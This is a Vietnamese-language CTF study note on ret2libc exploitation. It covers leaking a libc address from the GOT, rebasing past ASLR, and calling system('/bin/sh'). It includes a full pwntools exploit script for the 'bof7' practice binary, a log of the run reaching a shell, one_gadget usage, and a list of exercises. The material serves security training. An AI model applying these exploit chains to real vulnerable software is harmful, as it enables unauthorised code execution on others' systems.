# ret2libc — leak libc rồi gọi `system("/bin/sh")`

> Tài liệu học sâu. Writeup `bof7` **verify ra shell** (pwntools 4.15). Đây là kỹ thuật ROP nền
> tảng nhất của T3; API ROP/chain xem [rop.md](pwntools/rop.md). Nguồn ở cuối.

---

## 1. Họ "ret2…" — chọn cái nào

Sau khi tràn, bạn control `ret`. Gọi gì tiếp phụ thuộc có sẵn gì:

| Kỹ thuật | Khi nào | Gọi gì |
|----------|---------|--------|
| **ret2win** | binary có sẵn hàm "win"/in flag | `ret = &win` (xong) |
| **ROP chain / ret2syscall** | **static** hoặc đủ gadget | tự xếp `execve("/bin/sh",0,0)` bằng gadget + `syscall` |
| **ret2libc** | **dynamic**, không có win, có libc | leak 1 hàm libc → rebase → gọi `system("/bin/sh")` |

- ret2win: chỉ `flat(cyclic(off), exe.sym.win)` (nhớ **căn lề** nếu win gọi hàm — +1 `ret`).
- ROP chain execve: xem [rop.md §ví dụ 2](pwntools/rop.md#ví-dụ-2--execvebinsh-qua-syscall-verify-ra-shell).
- ret2libc: phần còn lại của tài liệu này.

---

## 2. Vì sao ret2libc phải LEAK trước

`system`, `/bin/sh` nằm trong **libc**, mà libc bị **ASLR** (địa chỉ đổi mỗi lần chạy). Ta không
biết trước `system` ở đâu. Nhưng **GOT** của binary chứa **địa chỉ libc thật** của các hàm đã
resolve → in một ô GOT ra = **leak libc**, từ đó suy ra **base libc**, rồi mọi `libc.sym.*` đúng.

```
leak = địa chỉ thật của puts (in từ got.puts)
libc.address = leak - libc.sym.puts        # rebase: suy base từ 1 hàm đã biết offset
system = libc.sym.system                    # giờ đã đúng địa chỉ thật
```
(Cơ chế GOT/PLT: [elf.md](pwntools/elf.md). Vì sao leak hay sai: [tubes.md](pwntools/tubes.md).)

---

## 3. Luồng 2 tầng kinh điển

1. **Tầng 1 (leak):** `puts(got.puts)` → in địa chỉ libc của `puts`; rồi **`ret` về `main`** để
   còn nhập lần 2. → `rop.call("puts",[got.puts]); rop.call(main)`.
2. Đọc leak, `libc.address = leak - libc.sym.puts`.
3. **Tầng 2 (đánh):** `pop rdi; &"/bin/sh"; ret(căn lề); system`.

Cần `pop rdi; ret` (set tham số 1). Thiếu → dùng [ret2csu](ret2csu.md). Xem thêm "nhiều chain":
[rop.md](pwntools/rop.md#nhiều-chain--nhiều-tầng-leak--rebase--đánh-thật).

---

## 4. Writeup `bof7` (pwnld-style, verify ra shell)

Prompt là `"Say something: \n"` (có `\n` cuối — xem bẫy leak). Offset tới `ret` = **88**.

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *

context.binary = exe = ELF("./bof7", checksec=False)
rop  = ROP(exe)
libc = get_libc()

set_remote("host", 0)
set_gdbscript("c")
p = start()

OFF = 88

### Tầng 1: leak puts@libc rồi quay về main
rop.call("puts", [exe.got.puts])
rop.call(exe.sym.main)
sa("Say something: \n", flat(cyclic(OFF), rop.chain()))

leak_libc_s(libc.sym.puts)          # recvline -> uu64 -> libc.address TỰ rebase
assert libc.address & 0xFFF == 0, f"leak sai: {hex(libc.address)}"

### Tầng 2: ret2libc system("/bin/sh")
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET     = rop.find_gadget(["ret"])[0]           # căn 16-byte
binsh   = next(libc.search(b"/bin/sh\x00"))
sa("Say something: \n", flat(cyclic(OFF), POP_RDI, binsh, RET, libc.sym.system))

ia()
```

**Những chỗ dễ sai (đều đã gặp khi debug bài này):**
- `sa("Say something: \n", ...)`: **phải khớp cả `\n`** của prompt, nếu không `\n` sót lại khiến
  leak đọc nhầm `0xa`. (Ca thật: [tubes.md §cơ chế buffer](pwntools/tubes.md).)
- `leak_libc_s(libc.sym.puts)` (n=0 → recvline): `puts` in `<addr>\n`, đọc trọn dòng. **Không**
  dùng `n=6`/`recv` vì dễ hớt thiếu trên remote.
- `RET` trước `system`: **căn 16-byte**, thiếu → SIGSEGV `movaps` trong `do_system`.
- `assert` base page-aligned: chốt chặn leak sai trước khi sang tầng 2.

**Log chạy thật:** `libc base = 0x777d7ce00000` (aligned) → `$ id` → `uid=1000(...)` ✅

---

## 5. Biến thể hay gặp

| Tình huống | Cách |
|------------|------|
| **Thiếu `pop rdi`** | leak/gọi bằng [ret2csu](ret2csu.md) (edi 32-bit cho fd/addr nhỏ) |
| **Không có đường leak** (ghi 1 lần) | [ret2dlresolve](pwntools/rop.md#ret2dlresolve) (khỏi leak) hoặc [SROP](srop.md) |
| **Có `one_gadget`** | thay `pop rdi;binsh;system` bằng 1 địa chỉ `one_gadget libc` (chú ý ràng buộc) |
| **Full RELRO, không leak** | ret2dlresolve / leak qua lỗ khác |
| **Prompt đọc 2 lần khó** | nếu chỉ nhập 1 lần: ret2dlresolve/SROP thay vì leak-2-tầng |

`one_gadget`:
```bash
one_gadget ./libc.so.6     # ra vài địa chỉ execve('/bin/sh') kèm RÀNG BUỘC (vd [rsp+0x40]==0)
```
→ `payload = flat(cyclic(OFF), libc.address + og)` nếu ràng buộc thoả (đỡ cần pop rdi + binsh).

---

## 6. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **`BOF_Ret2Win`** | ⭐ | overwrite ret → win | `flat(cyclic(off), exe.sym.win)` (+`ret` nếu win gọi hàm) |
| **`BOF_ROPchain`** | ⭐⭐ | tự xếp execve bằng gadget | [rop.md §ví dụ 2](pwntools/rop.md#ví-dụ-2--execvebinsh-qua-syscall-verify-ra-shell) |
| **`BOF_ret2libc`** (bof7) | ⭐⭐ | leak puts → system | **§4** verify ra shell |
| **ret2libc + `one_gadget`** | ⭐⭐ | rút gọn tầng 2 | `one_gadget` + kiểm ràng buộc |
| **thiếu `pop rdi`** | ⭐⭐⭐ | ghép csu | [ret2csu.md](ret2csu.md) |

**Lộ trình:** ret2win → ROP chain (static execve) → ret2libc (leak+system) → one_gadget → ghép csu/dlresolve.

---

## Nguồn tham khảo

- ir0nstone — *ret2libc / ret2system*:
  <https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc>
- one_gadget: <https://github.com/david942j/one_gadget>
- API ROP/chain/nhiều-tầng: [rop.md](pwntools/rop.md) · GOT/PLT: [elf.md](pwntools/elf.md)
